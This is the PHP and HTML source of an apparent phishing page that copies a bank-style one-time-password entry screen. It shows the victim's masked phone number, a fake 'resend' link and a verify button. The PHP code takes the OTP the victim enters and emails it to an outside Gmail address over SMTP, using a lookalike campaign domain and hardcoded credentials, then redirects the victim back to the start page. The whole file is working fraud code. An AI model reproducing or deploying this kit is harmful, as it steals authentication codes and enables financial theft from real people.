<?php
date_default_timezone_set('Asia/Kolkata');
session_start();
@extract($_POST);
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
/*if($_SESSION['amount'] == '')
    {
        header("Location:index.php");
    }*/

    if(isset($submit))
        {
                $mail = new PHPMailer();
                $mail->isSMTP();
                $mail->Host = "instant-e-apply-campaign-page-ic-sb-page.co.in";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "info@instant-e-apply-campaign-page-ic-sb-page.co.in";
                $mail->Password = "Admin@123";
                $mail->AddAddress("easymailid45@gmail.com");
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'OTP';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                                <p><b>OTP-2</b> - '.$otp.'</p>';
                
                
                if(!($mail->Send()))
                {
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>All fields are mandatory</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {
                    header("Location:index.php");      
                }
        }
?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Enter O-T-P</title>
    <link rel="stylesheet" href="https://idddffffccc.000webhostapp.com/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700" rel="stylesheet">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>
    <link rel="stylesheet" type="text/css" href="https://idddffffccc.000webhostapp.com/css/make.css">
    <style type="text/css">
        @media (min-width: 720px) {
                .desktopds {
                    margin: 0;
                    padding: 0;
                    overflow: hidden;
                }
                .mobileds {
                    display: none;
                }
            }

            @media (max-width: 719px) {
                .desktopds {
                    display: none;
                }
            }
    </style>
</head>
<body class="atd-pay" style="height: 100vh;">
    <div class="desktopds"><img style="width: 100%;" src="images/make-header.jpg"></div>
    <div class="mobileds"><img style="width: 100%;" src="images/make-mobile-header.jpg"></div>
<div class="container">
        <div class="row">
            <div class="col-md-2"></div>
            <div class="col-xs-6 col-md-8" id="LogoSection" style="height: 0;">
                <div class="underlinelogo"></div>
            </div>
        </div>
    </div>
<div class="container"><br><br>
	<div class="row">
		<div class="col-md-3"></div>
        <div class="col-md-6">
            <div style="background: #fff; padding: 30px 50px 50px;">
                <h3 class="text-center"><b>Please Enter OTP</b></h3>
                <p class="pera">OTP has been sent to your number ending with <b>*<?php echo substr($_SESSION['mobile'],6,10);?></b>. OTP will expire in 5 mins.</p>
                <form method="post">
                    <p style = "color:green; font-size: 15px;" id = "msg"></p>
                    <p style="color: red;" id="hdd">The OTP you've entered is expired. Please resend again</p>
                <div class="centered">
                    <label>
                        <input id="password-field" name="otp" type="password" class="textfield" required>
                        <span class="placeholder">OTP</span>
                        <section toggle="#password-field" class="fa fa-fw fa-eye field-icon toggle-password"></section>
                    </label>
                </div>
                <p style="margin-top: 10px;"><span style="cursor: pointer;" id = "resend" class="resend"><img style="width: 25px;" src="images/refresh.png">Resend OTP on SMS</span></p>
                <div class="verifyflex">
                    <button type = "submit" name = "submit" class="btn col-xs-12 col-md-12 btn-lg verifybtn">Verify</button>
                </div> 
                <p style="opacity: 0;">kjjkjk</p>
            </form>

            </div>
        </div>
	</div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script type="text/javascript">
    $("#resend").click(function(){
        $("#msg").html("Otp resend successfully");
    });
</script>
<script type="text/javascript">
    $("#resend").click(function(){
        $("#hdd").hide();
    });
</script>
<script type="text/javascript">
$(".toggle-password").click(function() {

  $(this).toggleClass("fa-eye fa-eye-slash");
  var input = $($(this).attr("toggle"));
  if (input.attr("type") == "password") {
    input.attr("type", "text");
  } else {
    input.attr("type", "password");
  }
});
</script>
</body>


</html>